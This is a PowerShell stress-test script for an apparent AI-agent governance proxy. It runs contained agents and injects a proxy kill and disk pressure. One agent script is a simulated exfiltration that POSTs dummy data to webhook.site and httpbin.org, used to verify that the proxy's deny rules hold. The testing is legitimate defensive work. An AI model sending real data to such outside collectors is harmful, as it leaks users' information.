# ═══════════════════════════════════════════════════════════════════
# Analemma GVM — 1-Hour Stress Test (Windows Docker / Contained Mode)
#
# Runs multiple agent instances through GVM proxy in --contained mode
# with chaos injection. Collects metrics every 60s.
#
# Requirements:
#   - Windows 10/11 with Docker Desktop
#   - ANTHROPIC_API_KEY environment variable
#   - GVM proxy + CLI built (cargo build --release)
#   - Python 3.12+ (for agent scripts)
#
# Usage:
#   .\scripts\stress-test.ps1
#   .\scripts\stress-test.ps1 -Duration 30 -Agents 3
# ═══════════════════════════════════════════════════════════════════

param(
    [int]$Duration = 60,      # minutes
    [int]$Agents = 5,
    [int]$StaggerSec = 60
)

$ErrorActionPreference = "Continue"

$RepoDir = Split-Path -Parent (Split-Path -Parent $MyInvocation.MyCommand.Path)
$GvmBin = Join-Path $RepoDir "target\release\gvm.exe"
$ProxyBin = Join-Path $RepoDir "target\release\gvm-proxy.exe"
$ProxyUrl = "http://127.0.0.1:8080"
$AdminUrl = "http://127.0.0.1:9090"
$Timestamp = Get-Date -Format "yyyyMMddTHHmmss"
$ResultsDir = Join-Path $RepoDir "results\stress-win-$Timestamp"
$MetricsCsv = Join-Path $ResultsDir "metrics.csv"
$ChaosLog = Join-Path $ResultsDir "chaos.log"
$Summary = Join-Path $ResultsDir "summary.txt"

# Create results directory
New-Item -ItemType Directory -Force -Path "$ResultsDir\agents" | Out-Null

Write-Host "`n=== GVM Stress Test (Windows Docker) ===" -ForegroundColor Cyan
Write-Host "  Mode:       contained (Docker)"
Write-Host "  Duration:   ${Duration}m"
Write-Host "  Agents:     $Agents"
Write-Host "  Results:    $ResultsDir"
Write-Host ""

# ── Validation ──
if (-not $env:ANTHROPIC_API_KEY) {
    Write-Host "ERROR: ANTHROPIC_API_KEY not set" -ForegroundColor Red
    exit 1
}
if (-not (Test-Path $ProxyBin)) {
    Write-Host "ERROR: Proxy not built: $ProxyBin" -ForegroundColor Red
    exit 1
}
if (-not (docker version 2>$null)) {
    Write-Host "ERROR: Docker not available" -ForegroundColor Red
    exit 1
}

# Verify host.docker.internal is resolvable from Docker (WSL2 known issue)
Write-Host "  Checking host.docker.internal resolution..." -NoNewline
$hostCheck = docker run --rm python:3.12-slim python3 -c "import socket; socket.getaddrinfo('host.docker.internal', 8080)" 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Host " FAILED" -ForegroundColor Red
    Write-Host "  host.docker.internal is not resolvable from Docker containers."
    Write-Host "  This is a known WSL2/Docker Desktop issue. Try restarting Docker Desktop."
    exit 1
}
Write-Host " OK" -ForegroundColor Green

# ── Start Proxy ──
$ProxyJob = Start-Process -FilePath $ProxyBin -ArgumentList "--config", "$RepoDir\config\proxy.toml" `
    -RedirectStandardOutput "$ResultsDir\proxy.log" -RedirectStandardError "$ResultsDir\proxy-err.log" `
    -PassThru -NoNewWindow
$ProxyPid = $ProxyJob.Id
Start-Sleep -Seconds 3

# Verify health
try {
    $health = Invoke-RestMethod -Uri "$ProxyUrl/gvm/health" -TimeoutSec 5
    if ($health.status -ne "healthy") { throw "unhealthy" }
    Write-Host "  Proxy started (PID $ProxyPid)" -ForegroundColor Green
} catch {
    Write-Host "ERROR: Proxy failed to start" -ForegroundColor Red
    exit 1
}

# ── Metrics CSV Header ──
"timestamp,elapsed_sec,proxy_mem_mb,proxy_cpu,docker_containers,proxy_healthy,wal_bytes" | Out-File -FilePath $MetricsCsv -Encoding utf8

# ── Agent Scripts ──
$AgentScripts = @(
    @{ Id=1; Name="github-read"; Code=@'
import requests, time, random
proxy = "http://host.docker.internal:8080"
proxies = {"http": proxy, "https": proxy}
repos = ["torvalds/linux", "rust-lang/rust", "golang/go", "python/cpython"]
for i in range(100):
    repo = random.choice(repos)
    try:
        r = requests.get(f"http://api.github.com/repos/{repo}/issues?per_page=1", proxies=proxies, timeout=15)
        print(f"[{i}] GET {repo}/issues -> {r.status_code}")
    except Exception as e:
        print(f"[{i}] ERR: {e}")
    time.sleep(random.uniform(10, 30))
'@},
    @{ Id=2; Name="exfiltration"; Code=@'
import requests, time, random
proxy = "http://host.docker.internal:8080"
proxies = {"http": proxy, "https": proxy}
targets = ["http://webhook.site/test", "http://httpbin.org/post"]
for i in range(100):
    url = random.choice(targets)
    try:
        r = requests.post(url, json={"data": f"stress-{i}"}, proxies=proxies, timeout=15)
        print(f"[{i}] POST {url} -> {r.status_code}")
    except Exception as e:
        print(f"[{i}] ERR: {e}")
    time.sleep(random.uniform(10, 30))
'@},
    @{ Id=3; Name="unknown-hosts"; Code=@'
import requests, time, random
proxy = "http://host.docker.internal:8080"
proxies = {"http": proxy, "https": proxy}
urls = [
    "http://catfact.ninja/fact", "http://dog.ceo/api/breeds/image/random",
    "http://api.coindesk.com/v1/bpi/currentprice.json", "http://numbersapi.com/42",
    "http://api.agify.io/?name=test", "http://api.genderize.io/?name=test",
]
for i in range(200):
    url = random.choice(urls)
    try:
        r = requests.get(url, proxies=proxies, timeout=15)
        print(f"[{i}] GET {url} -> {r.status_code}")
    except Exception as e:
        print(f"[{i}] ERR: {e}")
    time.sleep(random.uniform(5, 15))
'@},
)

# ── Launch Agents ──
$AgentProcesses = @()
$agentCount = [Math]::Min($Agents, $AgentScripts.Count)
for ($i = 0; $i -lt $agentCount; $i++) {
    $agent = $AgentScripts[$i]
    $scriptPath = Join-Path $ResultsDir "agents\agent-$($agent.Id).py"
    $agent.Code | Out-File -FilePath $scriptPath -Encoding utf8

    Write-Host "  Starting agent #$($agent.Id) ($($agent.Name))..." -ForegroundColor Cyan

    $agentJob = Start-Process -FilePath $GvmBin -ArgumentList "run", "--contained", "--agent-id", "stress-$($agent.Id)", $scriptPath `
        -RedirectStandardOutput "$ResultsDir\agents\agent-$($agent.Id).log" `
        -RedirectStandardError "$ResultsDir\agents\agent-$($agent.Id)-err.log" `
        -PassThru -NoNewWindow
    $AgentProcesses += $agentJob

    if ($i -lt ($agentCount - 1)) {
        Write-Host "  Staggering ${StaggerSec}s..." -ForegroundColor DarkGray
        Start-Sleep -Seconds $StaggerSec
    }
}
Write-Host "  All $agentCount agents launched" -ForegroundColor Green

# ── Main Loop ──
$StartTime = Get-Date
$DurationSec = $Duration * 60
$ChaosKillDone = $false
$ChaosDiskDone = $false

Write-Host "`nTest running for ${Duration} minutes..." -ForegroundColor White
Write-Host "  Chaos: T+20m (proxy kill), T+40m (disk pressure)" -ForegroundColor DarkGray

while ($true) {
    $elapsed = ((Get-Date) - $StartTime).TotalSeconds
    if ($elapsed -ge $DurationSec) { break }

    $elapsedMin = [int]($elapsed / 60)

    # Collect metrics
    try {
        $proc = Get-Process -Id $ProxyPid -ErrorAction SilentlyContinue
        $memMb = if ($proc) { [math]::Round($proc.WorkingSet64 / 1MB, 1) } else { 0 }
        $cpu = if ($proc) { [math]::Round($proc.CPU, 1) } else { 0 }
        $containers = (docker ps -q 2>$null | Measure-Object).Count
        $healthy = try { (Invoke-RestMethod -Uri "$ProxyUrl/gvm/health" -TimeoutSec 2).status } catch { "dead" }
        $walBytes = if (Test-Path "$RepoDir\data\wal.log") { (Get-Item "$RepoDir\data\wal.log").Length } else { 0 }
        $ts = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
        "$ts,$([int]$elapsed),$memMb,$cpu,$containers,$healthy,$walBytes" | Out-File -FilePath $MetricsCsv -Encoding utf8 -Append
        Write-Host "  [$ts] RSS=${memMb}MB containers=$containers health=$healthy" -ForegroundColor DarkGray
    } catch {}

    # Chaos: T+20 proxy kill
    if ($elapsedMin -ge 15 -and -not $ChaosKillDone) {
        $ChaosKillDone = $true
        $ts = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
        "[$ts] INJECT: taskkill proxy (PID $ProxyPid)" | Out-File -FilePath $ChaosLog -Encoding utf8 -Append
        Write-Host "  CHAOS: Killing proxy!" -ForegroundColor Yellow
        Stop-Process -Id $ProxyPid -Force -ErrorAction SilentlyContinue

        # Wait for manual restart (Windows has no watchdog)
        Start-Sleep -Seconds 5
        $ProxyJob = Start-Process -FilePath $ProxyBin -ArgumentList "--config", "$RepoDir\config\proxy.toml" `
            -RedirectStandardOutput "$ResultsDir\proxy-restart.log" -PassThru -NoNewWindow
        $ProxyPid = $ProxyJob.Id
        Start-Sleep -Seconds 3
        "[$ts] RESTART: proxy PID $ProxyPid" | Out-File -FilePath $ChaosLog -Encoding utf8 -Append

        # Verify SRR rules loaded after restart (fail-open prevention)
        Start-Sleep -Seconds 2
        try {
            $check = Invoke-RestMethod -Uri "$ProxyUrl/gvm/check" -Method POST `
                -ContentType "application/json" `
                -Body '{"method":"POST","target_host":"webhook.site","target_path":"/test","operation":"test"}' `
                -TimeoutSec 5
            if ($check.decision -match "Deny") {
                "[$ts] VERIFY: SRR rules loaded (webhook.site -> Deny)" | Out-File -FilePath $ChaosLog -Encoding utf8 -Append
            } else {
                "[$ts] FAIL: SRR rules NOT loaded — fail-open risk (got: $($check.decision))" | Out-File -FilePath $ChaosLog -Encoding utf8 -Append
            }
        } catch {
            "[$ts] WARN: SRR verification failed (proxy may still be starting)" | Out-File -FilePath $ChaosLog -Encoding utf8 -Append
        }
    }

    # Chaos: T+40 disk pressure (create large file in WAL directory)
    if ($elapsedMin -ge 35 -and -not $ChaosDiskDone) {
        $ChaosDiskDone = $true
        $ts = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
        "[$ts] INJECT: disk pressure" | Out-File -FilePath $ChaosLog -Encoding utf8 -Append
        Write-Host "  CHAOS: Disk pressure!" -ForegroundColor Yellow
        # Create 100MB file
        $fillPath = Join-Path $RepoDir "data\stress-fill.dat"
        [System.IO.File]::WriteAllBytes($fillPath, (New-Object byte[] (100MB)))
    }

    Start-Sleep -Seconds 60
}

# ── Cleanup ──
Write-Host "`nCleaning up..." -ForegroundColor White
foreach ($proc in $AgentProcesses) {
    Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
}
Stop-Process -Id $ProxyPid -Force -ErrorAction SilentlyContinue
docker ps -q --filter "name=gvm-agent" | ForEach-Object { docker rm -f $_ 2>$null }
Remove-Item -Path "$RepoDir\data\stress-fill.dat" -ErrorAction SilentlyContinue

# ── Summary ──
"=== Stress Test Summary (Windows Docker) ===" | Out-File -FilePath $Summary -Encoding utf8
"Duration: ${Duration}m" | Out-File -FilePath $Summary -Encoding utf8 -Append
"Agents: $agentCount" | Out-File -FilePath $Summary -Encoding utf8 -Append
"Results: $ResultsDir" | Out-File -FilePath $Summary -Encoding utf8 -Append

Write-Host "`nResults saved to: $ResultsDir" -ForegroundColor Cyan
Get-Content $Summary
